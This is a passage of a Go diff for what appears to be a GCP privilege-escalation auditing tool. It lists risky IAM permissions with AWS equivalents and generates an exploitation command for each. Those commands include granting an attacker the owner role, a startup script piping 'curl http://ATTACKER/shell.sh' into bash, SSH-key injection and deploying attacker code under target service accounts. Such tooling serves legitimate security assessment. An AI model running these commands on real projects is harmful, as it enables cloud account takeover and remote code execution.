@@ -241,88 +241,188 @@ func GetLateralMovementPermissions() []LateralMovementPermission {
 }
 
 // GetPrivescPermissions returns permissions that enable privilege escalation
+// Based on research from DataDog pathfinding.cloud AWS paths, mapped to GCP equivalents
 func GetPrivescPermissions() []PrivescPermission {
 	return []PrivescPermission{
-		// Service Account Impersonation - CRITICAL
-		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate access tokens for any SA"},
-		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign blobs as SA (GCS signed URLs)"},
-		{Permission: "iam.serviceAccounts.signJwt", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign JWTs as SA (impersonation)"},
-		{Permission: "iam.serviceAccounts.implicitDelegation", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Delegate SA identity to others"},
-		{Permission: "iam.serviceAccounts.getOpenIdToken", Category: "SA Impersonation", RiskLevel: "HIGH", Description: "Generate OIDC tokens for SA"},
+		// ==========================================
+		// SERVICE ACCOUNT IMPERSONATION - CRITICAL
+		// AWS equivalent: sts:AssumeRole
+		// ==========================================
+		{Permission: "iam.serviceAccounts.getAccessToken", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Generate access tokens for any SA (AWS: sts:AssumeRole)"},
+		{Permission: "iam.serviceAccounts.signBlob", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign blobs as SA for GCS signed URLs or custom auth"},
+		{Permission: "iam.serviceAccounts.signJwt", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Sign JWTs as SA for custom authentication flows"},
+		{Permission: "iam.serviceAccounts.implicitDelegation", Category: "SA Impersonation", RiskLevel: "CRITICAL", Description: "Chain impersonation through intermediary SAs"},
+		{Permission: "iam.serviceAccounts.getOpenIdToken", Category: "SA Impersonation", RiskLevel: "HIGH", Description: "Generate OIDC tokens for workload identity federation"},
 
-		// Key Creation - CRITICAL
-		{Permission: "iam.serviceAccountKeys.create", Category: "Key Creation", RiskLevel: "CRITICAL", Description: "Create persistent SA keys"},
+		// ==========================================
+		// KEY/CREDENTIAL CREATION - CRITICAL
+		// AWS equivalent: iam:CreateAccessKey
+		// ==========================================
+		{Permission: "iam.serviceAccountKeys.create", Category: "Key Creation", RiskLevel: "CRITICAL", Description: "Create persistent SA keys (AWS: iam:CreateAccessKey)"},
+		{Permission: "iam.serviceAccountKeys.delete", Category: "Key Creation", RiskLevel: "HIGH", Description: "Delete existing keys to create new ones (bypass 10-key limit)"},
 		{Permission: "storage.hmacKeys.create", Category: "Key Creation", RiskLevel: "HIGH", Description: "Create HMAC keys for S3-compatible access"},
+		{Permission: "apikeys.keys.create", Category: "Key Creation", RiskLevel: "MEDIUM", Description: "Create API keys for service access"},
 
-		// IAM Modification - CRITICAL
-		{Permission: "resourcemanager.projects.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify project-level IAM policy"},
-		{Permission: "resourcemanager.folders.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify folder-level IAM policy"},
-		{Permission: "resourcemanager.organizations.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify org-level IAM policy"},
-		{Permission: "iam.serviceAccounts.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Grant access to service accounts"},
-		{Permission: "iam.roles.update", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify custom role permissions"},
-		{Permission: "iam.roles.create", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Create new custom roles"},
+		// ==========================================
+		// IAM POLICY MODIFICATION - CRITICAL
+		// AWS equivalent: iam:PutRolePolicy, iam:AttachRolePolicy, iam:CreatePolicyVersion
+		// ==========================================
+		{Permission: "resourcemanager.projects.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify project IAM - grant any role to any principal"},
+		{Permission: "resourcemanager.folders.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify folder IAM - affects all child projects"},
+		{Permission: "resourcemanager.organizations.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Modify org IAM - affects entire organization"},
+		{Permission: "iam.serviceAccounts.setIamPolicy", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Grant impersonation access to service accounts"},
+		{Permission: "iam.roles.update", Category: "IAM Modification", RiskLevel: "CRITICAL", Description: "Add permissions to custom roles (AWS: iam:CreatePolicyVersion)"},
+		{Permission: "iam.roles.create", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Create custom roles with dangerous permissions"},
+		{Permission: "iam.roles.delete", Category: "IAM Modification", RiskLevel: "MEDIUM", Description: "Delete roles to disrupt access controls"},
 
-		// Resource-specific IAM Modification - HIGH
-		{Permission: "pubsub.topics.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify Pub/Sub topic IAM policy"},
-		{Permission: "pubsub.subscriptions.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify Pub/Sub subscription IAM policy"},
-		{Permission: "bigquery.datasets.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify BigQuery dataset IAM policy"},
-		{Permission: "artifactregistry.repositories.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify Artifact Registry IAM policy"},
-		{Permission: "compute.instances.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Modify Compute instance IAM policy"},
+		// Resource-level IAM Modification
+		{Permission: "storage.buckets.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to storage buckets"},
+		{Permission: "pubsub.topics.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to Pub/Sub topics"},
+		{Permission: "pubsub.subscriptions.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to Pub/Sub subscriptions"},
+		{Permission: "bigquery.datasets.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to BigQuery datasets"},
+		{Permission: "artifactregistry.repositories.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to container/artifact registries"},
+		{Permission: "compute.instances.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant OS Login access to instances"},
+		{Permission: "compute.images.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Share VM images with external projects"},
+		{Permission: "compute.snapshots.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Share disk snapshots with external projects"},
+		{Permission: "kms.cryptoKeys.setIamPolicy", Category: "IAM Modification", RiskLevel: "HIGH", Description: "Grant access to encryption keys"},
 
-		// Compute Access - HIGH
-		{Permission: "compute.instances.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create compute instances with SA"},
-		{Permission: "compute.instances.setMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Modify instance metadata (SSH keys, startup scripts)"},
-		{Permission: "compute.instances.setServiceAccount", Category: "Compute", RiskLevel: "HIGH", Description: "Change instance service account"},
-		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Modify project-wide metadata"},
-		{Permission: "compute.instances.osLogin", Category: "Compute", RiskLevel: "MEDIUM", Description: "SSH into instances via OS Login"},
+		// ==========================================
+		// COMPUTE + SA USAGE (PassRole equivalent)
+		// AWS equivalent: iam:PassRole + ec2:RunInstances
+		// ==========================================
+		{Permission: "compute.instances.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create VMs with attached SA (AWS: PassRole+RunInstances)"},
+		{Permission: "compute.instances.setServiceAccount", Category: "Compute", RiskLevel: "HIGH", Description: "Change instance SA to escalate privileges"},
+		{Permission: "compute.instances.setMetadata", Category: "Compute", RiskLevel: "HIGH", Description: "Inject SSH keys or startup scripts"},
+		{Permission: "compute.projects.setCommonInstanceMetadata", Category: "Compute", RiskLevel: "CRITICAL", Description: "Inject SSH keys project-wide"},
+		{Permission: "compute.instances.osLogin", Category: "Compute", RiskLevel: "MEDIUM", Description: "SSH access via OS Login (AWS: ssm:StartSession)"},
 		{Permission: "compute.instances.osAdminLogin", Category: "Compute", RiskLevel: "HIGH", Description: "SSH with sudo via OS Login"},
+		{Permission: "compute.instanceTemplates.create", Category: "Compute", RiskLevel: "HIGH", Description: "Create templates with SA for MIG exploitation"},
 
-		// Cloud Functions - HIGH
-		{Permission: "cloudfunctions.functions.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy functions with SA identity"},
-		{Permission: "cloudfunctions.functions.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function code/SA"},
-		{Permission: "cloudfunctions.functions.sourceCodeSet", Category: "Serverless", RiskLevel: "HIGH", Description: "Change function source code"},
-		{Permission: "cloudfunctions.functions.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function IAM policy (make public)"},
+		// ==========================================
+		// SERVERLESS + SA USAGE (PassRole equivalent)
+		// AWS equivalent: iam:PassRole + lambda:CreateFunction
+		// ==========================================
+		{Permission: "cloudfunctions.functions.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy functions with SA (AWS: PassRole+Lambda)"},
+		{Permission: "cloudfunctions.functions.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify function code or SA"},
+		{Permission: "cloudfunctions.functions.sourceCodeSet", Category: "Serverless", RiskLevel: "HIGH", Description: "Replace function source code"},
+		{Permission: "cloudfunctions.functions.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Make functions publicly invocable"},
 
-		// Cloud Run - HIGH
-		{Permission: "run.services.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy services with SA identity"},
-		{Permission: "run.services.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service code/SA"},
-		{Permission: "run.services.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service IAM policy (make public)"},
-		{Permission: "run.jobs.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Create Cloud Run jobs with SA identity"},
-		{Permission: "run.jobs.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify Cloud Run job code/SA"},
+		// Cloud Run (AWS: ECS/Fargate equivalent)
+		{Permission: "run.services.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Deploy services with SA (AWS: PassRole+ECS)"},
+		{Permission: "run.services.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify service image or SA"},
+		{Permission: "run.services.setIamPolicy", Category: "Serverless", RiskLevel: "HIGH", Description: "Make services publicly accessible"},
+		{Permission: "run.jobs.create", Category: "Serverless", RiskLevel: "HIGH", Description: "Create jobs with SA identity"},
+		{Permission: "run.jobs.update", Category: "Serverless", RiskLevel: "HIGH", Description: "Modify job configuration or SA"},
+		{Permission: "run.jobs.run", Category: "Serverless", RiskLevel: "HIGH", Description: "Execute jobs with attached SA"},
 
-		// Data Processing - HIGH
-		{Permission: "dataproc.clusters.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataproc clusters with SA identity"},
-		{Permission: "dataproc.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Submit jobs to Dataproc clusters"},
-		{Permission: "dataflow.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataflow jobs with SA identity"},
+		// ==========================================
+		// DATA PROCESSING + SA USAGE (PassRole equivalent)
+		// AWS equivalent: iam:PassRole + glue:CreateDevEndpoint, datapipeline:*
+		// ==========================================
+		{Permission: "dataproc.clusters.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataproc with SA (AWS: PassRole+Glue)"},
+		{Permission: "dataproc.clusters.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify cluster SA or configuration"},
+		{Permission: "dataproc.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Submit jobs to clusters"},
+		{Permission: "dataproc.jobs.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify running jobs"},
+		{Permission: "dataflow.jobs.create", Category: "Data Processing", RiskLevel: "HIGH", Description: "Create Dataflow jobs with SA (AWS: DataPipeline)"},
+		{Permission: "dataflow.jobs.update", Category: "Data Processing", RiskLevel: "HIGH", Description: "Modify Dataflow job configuration"},
 
-		// Cloud Composer - CRITICAL
-		{Permission: "composer.environments.create", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Create Composer environments with SA identity"},
-		{Permission: "composer.environments.update", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Modify Composer environment configuration"},
+		// ==========================================
+		// ML/AI PLATFORMS + SA USAGE
+		// AWS equivalent: iam:PassRole + sagemaker:CreateNotebookInstance
+		// ==========================================
+		{Permission: "notebooks.instances.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Create Vertex AI Workbench with SA (AWS: PassRole+SageMaker)"},
+		{Permission: "notebooks.instances.update", Category: "AI/ML", RiskLevel: "HIGH", Description: "Modify notebook SA or configuration"},
+		{Permission: "notebooks.instances.setIamPolicy", Category: "AI/ML", RiskLevel: "HIGH", Description: "Grant access to notebook instances"},
+		{Permission: "aiplatform.customJobs.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Run custom training jobs with SA"},
+		{Permission: "aiplatform.pipelineJobs.create", Category: "AI/ML", RiskLevel: "HIGH", Description: "Create ML pipelines with SA"},
 
-		// Cloud Build - CRITICAL
-		{Permission: "cloudbuild.builds.create", Category: "CI/CD", RiskLevel: "CRITICAL", Description: "Run builds with Cloud Build SA"},
+		// ==========================================
+		// ORCHESTRATION (Composer = AWS equivalent of Step Functions/MWAA)
+		// ==========================================
+		{Permission: "composer.environments.create", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Create Composer/Airflow with SA"},
+		{Permission: "composer.environments.update", Category: "Orchestration", RiskLevel: "CRITICAL", Description: "Modify Composer environment SA"},
 
-		// GKE - HIGH
-		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get GKE cluster credentials"},
-		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Exec into pods"},
+		// Cloud Scheduler (AWS: EventBridge/CloudWatch Events)
+		{Permission: "cloudscheduler.jobs.create", Category: "Orchestration", RiskLevel: "HIGH", Description: "Create scheduled jobs with SA"},
+		{Permission: "cloudscheduler.jobs.update", Category: "Orchestration", RiskLevel: "HIGH", Description: "Modify scheduled job SA or target"},
+
+		// Cloud Tasks (AWS: SQS + Lambda triggers)
+		{Permission: "cloudtasks.tasks.create", Category: "Orchestration", RiskLevel: "HIGH", Description: "Create tasks with SA for HTTP targets"},
+		{Permission: "cloudtasks.queues.create", Category: "Orchestration", RiskLevel: "MEDIUM", Description: "Create task queues"},
+
+		// ==========================================
+		// CI/CD (Cloud Build = AWS CodeBuild)
+		// AWS equivalent: iam:PassRole + codebuild:CreateProject
+		// ==========================================
+		{Permission: "cloudbuild.builds.create", Category: "CI/CD", RiskLevel: "CRITICAL", Description: "Run builds with Cloud Build SA (AWS: PassRole+CodeBuild)"},
+		{Permission: "cloudbuild.builds.update", Category: "CI/CD", RiskLevel: "HIGH", Description: "Modify build configuration"},
+		{Permission: "source.repos.update", Category: "CI/CD", RiskLevel: "HIGH", Description: "Modify source repositories for build injection"},
+
+		// ==========================================
+		// INFRASTRUCTURE AS CODE
+		// AWS equivalent: iam:PassRole + cloudformation:CreateStack
+		// ==========================================
+		{Permission: "deploymentmanager.deployments.create", Category: "IaC", RiskLevel: "CRITICAL", Description: "Deploy infra with DM SA (AWS: PassRole+CloudFormation)"},
+		{Permission: "deploymentmanager.deployments.update", Category: "IaC", RiskLevel: "HIGH", Description: "Modify deployment templates"},
+
+		// ==========================================
+		// KUBERNETES/GKE
+		// AWS equivalent: eks:* permissions
+		// ==========================================
+		{Permission: "container.clusters.create", Category: "GKE", RiskLevel: "HIGH", Description: "Create GKE clusters with node SA"},
+		{Permission: "container.clusters.update", Category: "GKE", RiskLevel: "HIGH", Description: "Modify cluster node SA or config"},
+		{Permission: "container.clusters.getCredentials", Category: "GKE", RiskLevel: "HIGH", Description: "Get cluster credentials"},
+		{Permission: "container.pods.create", Category: "GKE", RiskLevel: "HIGH", Description: "Deploy pods with SA"},
+		{Permission: "container.pods.exec", Category: "GKE", RiskLevel: "HIGH", Description: "Exec into pods to steal credentials"},
 		{Permission: "container.secrets.get", Category: "GKE", RiskLevel: "HIGH", Description: "Read Kubernetes secrets"},
+		{Permission: "container.secrets.create", Category: "GKE", RiskLevel: "MEDIUM", Description: "Create K8s secrets for later access"},
+		{Permission: "container.serviceAccounts.createToken", Category: "GKE", RiskLevel: "HIGH", Description: "Generate K8s SA tokens"},
 
-		// Secrets - HIGH
-		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "HIGH", Description: "Access secret values"},
+		// ==========================================
+		// SECRETS & CREDENTIAL ACCESS
+		// AWS equivalent: secretsmanager:GetSecretValue, ssm:GetParameter
+		// ==========================================
+		{Permission: "secretmanager.versions.access", Category: "Secrets", RiskLevel: "HIGH", Description: "Access secret values (credentials, API keys)"},
 		{Permission: "secretmanager.secrets.setIamPolicy", Category: "Secrets", RiskLevel: "HIGH", Description: "Grant access to secrets"},
+		{Permission: "secretmanager.secrets.create", Category: "Secrets", RiskLevel: "MEDIUM", Description: "Create secrets for persistence"},
 
-		// Deployment Manager - CRITICAL
-		{Permission: "deploymentmanager.deployments.create", Category: "Deployment", RiskLevel: "CRITICAL", Description: "Deploy arbitrary infrastructure with DM SA"},
+		// ==========================================
+		// WORKLOAD IDENTITY FEDERATION
+		// AWS equivalent: iam:CreateOpenIDConnectProvider, iam:CreateSAMLProvider
+		// ==========================================
+		{Permission: "iam.workloadIdentityPools.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create pools for external identity access"},
+		{Permission: "iam.workloadIdentityPools.update", Category: "Federation", RiskLevel: "HIGH", Description: "Modify pool configuration"},
+		{Permission: "iam.workloadIdentityPoolProviders.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create providers for external impersonation"},
+		{Permission: "iam.workloadIdentityPoolProviders.update", Category: "Federation", RiskLevel: "HIGH", Description: "Modify provider configuration"},
 
-		// Workload Identity Federation - CRITICAL
-		{Permission: "iam.workloadIdentityPools.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create workload identity pools for external access"},
-		{Permission: "iam.workloadIdentityPoolProviders.create", Category: "Federation", RiskLevel: "CRITICAL", Description: "Create identity providers for external impersonation"},
+		// ==========================================
+		// ORG POLICIES & CONSTRAINTS
+		// AWS equivalent: organizations:* SCP modifications
+		// ==========================================
+		{Permission: "orgpolicy.policy.set", Category: "Org Policy", RiskLevel: "CRITICAL", Description: "Disable security constraints org-wide"},
+		{Permission: "orgpolicy.constraints.list", Category: "Org Policy", RiskLevel: "LOW", Description: "Enumerate security constraints"},
+		{Permission: "essentialcontacts.contacts.delete", Category: "Org Policy", RiskLevel: "MEDIUM", Description: "Remove security notification contacts"},
 
-		// Org Policies - CRITICAL
-		{Permission: "orgpolicy.policy.set", Category: "Org Policy", RiskLevel: "CRITICAL", Description: "Disable organization policy constraints"},
+		// ==========================================
+		// SERVICE ACCOUNT USAGE (Required for most PassRole equivalents)
+		// AWS equivalent: iam:PassRole
+		// ==========================================
+		{Permission: "iam.serviceAccounts.actAs", Category: "SA Usage", RiskLevel: "HIGH", Description: "Use SA for resource creation (AWS: iam:PassRole)"},
 
-		// SA Usage
-		{Permission: "iam.serviceAccounts.actAs", Category: "SA Usage", RiskLevel: "HIGH", Description: "Use SA for resource creation"},
+		// ==========================================
+		// NETWORK ACCESS FOR LATERAL MOVEMENT
+		// AWS equivalent: ec2:CreateNetworkInterface, ec2:ModifyInstanceAttribute
+		// ==========================================
+		{Permission: "iap.tunnelInstances.accessViaIAP", Category: "Network Access", RiskLevel: "MEDIUM", Description: "Access instances via IAP tunnel"},
+		{Permission: "compute.firewalls.create", Category: "Network Access", RiskLevel: "HIGH", Description: "Create firewall rules for access"},
+		{Permission: "compute.firewalls.update", Category: "Network Access", RiskLevel: "HIGH", Description: "Modify firewall rules"},
+
+		// ==========================================
+		// BILLING & RESOURCE CREATION
+		// Could be used to exhaust quotas or create resources
+		// ==========================================
+		{Permission: "billing.accounts.getIamPolicy", Category: "Billing", RiskLevel: "LOW", Description: "View billing IAM for enumeration"},
+		{Permission: "billing.accounts.setIamPolicy", Category: "Billing", RiskLevel: "HIGH", Description: "Grant billing access"},
 	}
 }
 
@@ -1025,31 +1125,161 @@ func generateLateralCommand(permission, projectID, scopeID string) string {
 
 func generatePrivescCommand(permission, projectID, scopeID string) string {
 	switch permission {
+	// Service Account Impersonation
 	case "iam.serviceAccounts.getAccessToken":
 		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
+	case "iam.serviceAccounts.signBlob":
+		return fmt.Sprintf("gcloud iam service-accounts sign-blob input.txt output.sig --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
+	case "iam.serviceAccounts.signJwt":
+		return fmt.Sprintf("gcloud iam service-accounts sign-jwt jwt.json signed.jwt --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
+	case "iam.serviceAccounts.implicitDelegation":
+		return fmt.Sprintf("# Chain through intermediary SA: gcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
+	case "iam.serviceAccounts.getOpenIdToken":
+		return fmt.Sprintf("gcloud auth print-identity-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com --audiences=https://TARGET", projectID)
+
+	// Key Creation
 	case "iam.serviceAccountKeys.create":
 		return fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
-	case "iam.serviceAccounts.signBlob":
-		return fmt.Sprintf("# Sign blob as SA: gcloud iam service-accounts sign-blob --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
-	case "iam.serviceAccounts.signJwt":
-		return fmt.Sprintf("# Sign JWT as SA: gcloud iam service-accounts sign-jwt --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
+	case "iam.serviceAccountKeys.delete":
+		return fmt.Sprintf("gcloud iam service-accounts keys delete KEY_ID --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
+	case "storage.hmacKeys.create":
+		return fmt.Sprintf("gcloud storage hmac create TARGET_SA@%s.iam.gserviceaccount.com", projectID)
+	case "apikeys.keys.create":
+		return fmt.Sprintf("gcloud alpha services api-keys create --project=%s", projectID)
+
+	// IAM Policy Modification
 	case "resourcemanager.projects.setIamPolicy":
-		return fmt.Sprintf("gcloud projects add-iam-policy-binding %s --member=user:ATTACKER --role=roles/owner", projectID)
+		return fmt.Sprintf("gcloud projects add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", projectID)
 	case "resourcemanager.folders.setIamPolicy":
-		return fmt.Sprintf("gcloud resource-manager folders add-iam-policy-binding %s --member=user:ATTACKER --role=roles/owner", scopeID)
+		return fmt.Sprintf("gcloud resource-manager folders add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", scopeID)
 	case "resourcemanager.organizations.setIamPolicy":
-		return fmt.Sprintf("gcloud organizations add-iam-policy-binding %s --member=user:ATTACKER --role=roles/owner", scopeID)
+		return fmt.Sprintf("gcloud organizations add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", scopeID)
+	case "iam.serviceAccounts.setIamPolicy":
+		return fmt.Sprintf("gcloud iam service-accounts add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/iam.serviceAccountTokenCreator", scopeID)
+	case "iam.roles.update":
+		return fmt.Sprintf("gcloud iam roles update ROLE_ID --project=%s --add-permissions=iam.serviceAccounts.getAccessToken", projectID)
+	case "iam.roles.create":
+		return fmt.Sprintf("gcloud iam roles create privesc_role --project=%s --permissions=iam.serviceAccounts.getAccessToken,iam.serviceAccountKeys.create", projectID)
+
+	// Resource-level IAM
+	case "storage.buckets.setIamPolicy":
+		return fmt.Sprintf("gsutil iam ch user:ATTACKER@gmail.com:objectAdmin gs://%s", scopeID)
+	case "pubsub.topics.setIamPolicy":
+		return fmt.Sprintf("gcloud pubsub topics add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/pubsub.publisher --project=%s", scopeID, projectID)
+	case "bigquery.datasets.setIamPolicy":
+		return fmt.Sprintf("bq update --source=dataset_acl.json %s:%s", projectID, scopeID)
+	case "secretmanager.secrets.setIamPolicy":
+		return fmt.Sprintf("gcloud secrets add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/secretmanager.secretAccessor --project=%s", scopeID, projectID)
+	case "kms.cryptoKeys.setIamPolicy":
+		return fmt.Sprintf("gcloud kms keys add-iam-policy-binding KEY --keyring=KEYRING --location=LOCATION --member=user:ATTACKER@gmail.com --role=roles/cloudkms.cryptoKeyDecrypter --project=%s", projectID)
+
+	// Compute
+	case "compute.instances.create":
+		return fmt.Sprintf("gcloud compute instances create pwn-vm --service-account=TARGET_SA@%s.iam.gserviceaccount.com --scopes=cloud-platform --zone=us-central1-a --project=%s", projectID, projectID)
+	case "compute.instances.setServiceAccount":
+		return fmt.Sprintf("gcloud compute instances set-service-account INSTANCE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --zone=ZONE --project=%s", projectID, projectID)
 	case "compute.instances.setMetadata":
-		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --zone=ZONE --metadata=startup-script='#!/bin/bash\\ncurl ATTACKER' --project=%s", projectID)
+		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --zone=ZONE --metadata=startup-script='curl http://ATTACKER/shell.sh|bash' --project=%s", projectID)
+	case "compute.projects.setCommonInstanceMetadata":
+		return fmt.Sprintf("gcloud compute project-info add-metadata --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\" --project=%s", projectID)
+	case "compute.instances.osLogin":
+		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s", projectID)
+	case "compute.instances.osAdminLogin":
+		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s  # Then: sudo su", projectID)
+	case "compute.instanceTemplates.create":
+		return fmt.Sprintf("gcloud compute instance-templates create pwn-template --service-account=TARGET_SA@%s.iam.gserviceaccount.com --scopes=cloud-platform --project=%s", projectID, projectID)
+
+	// Cloud Functions
 	case "cloudfunctions.functions.create":
-		return fmt.Sprintf("gcloud functions deploy pwn --runtime=python39 --trigger-http --project=%s --service-account=TARGET_SA", projectID)
+		return fmt.Sprintf("gcloud functions deploy pwn --runtime=python39 --trigger-http --service-account=TARGET_SA@%s.iam.gserviceaccount.com --entry-point=main --source=. --project=%s", projectID, projectID)
+	case "cloudfunctions.functions.update":
+		return fmt.Sprintf("gcloud functions deploy EXISTING_FUNC --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+	case "cloudfunctions.functions.sourceCodeSet":
+		return fmt.Sprintf("gcloud functions deploy FUNC --source=gs://ATTACKER_BUCKET/malicious.zip --project=%s", projectID)
+	case "cloudfunctions.functions.setIamPolicy":
+		return fmt.Sprintf("gcloud functions add-iam-policy-binding FUNC --member=allUsers --role=roles/cloudfunctions.invoker --project=%s", projectID)
+
+	// Cloud Run
 	case "run.services.create":
-		return fmt.Sprintf("gcloud run deploy pwn --image=ATTACKER_IMAGE --project=%s --service-account=TARGET_SA", projectID)
+		return fmt.Sprintf("gcloud run deploy pwn --image=ATTACKER_IMAGE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --allow-unauthenticated --region=us-central1 --project=%s", projectID, projectID)
+	case "run.services.update":
+		return fmt.Sprintf("gcloud run services update SERVICE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
+	case "run.jobs.create":
+		return fmt.Sprintf("gcloud run jobs create pwn-job --image=ATTACKER_IMAGE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
+	case "run.jobs.run":
+		return fmt.Sprintf("gcloud run jobs execute JOB_NAME --region=us-central1 --project=%s", projectID)
+
+	// Data Processing
+	case "dataproc.clusters.create":
+		return fmt.Sprintf("gcloud dataproc clusters create pwn-cluster --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
+	case "dataproc.jobs.create":
+		return fmt.Sprintf("gcloud dataproc jobs submit pyspark gs://ATTACKER/pwn.py --cluster=CLUSTER --region=us-central1 --project=%s", projectID)
+	case "dataflow.jobs.create":
+		return fmt.Sprintf("gcloud dataflow jobs run pwn-job --gcs-location=gs://dataflow-templates/latest/... --service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
+
+	// AI/ML
+	case "notebooks.instances.create":
+		return fmt.Sprintf("gcloud notebooks instances create pwn-notebook --location=us-central1-a --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+	case "aiplatform.customJobs.create":
+		return fmt.Sprintf("gcloud ai custom-jobs create --display-name=pwn-job --worker-pool-spec=... --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
+
+	// Orchestration
+	case "composer.environments.create":
+		return fmt.Sprintf("gcloud composer environments create pwn-env --location=us-central1 --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+	case "cloudscheduler.jobs.create":
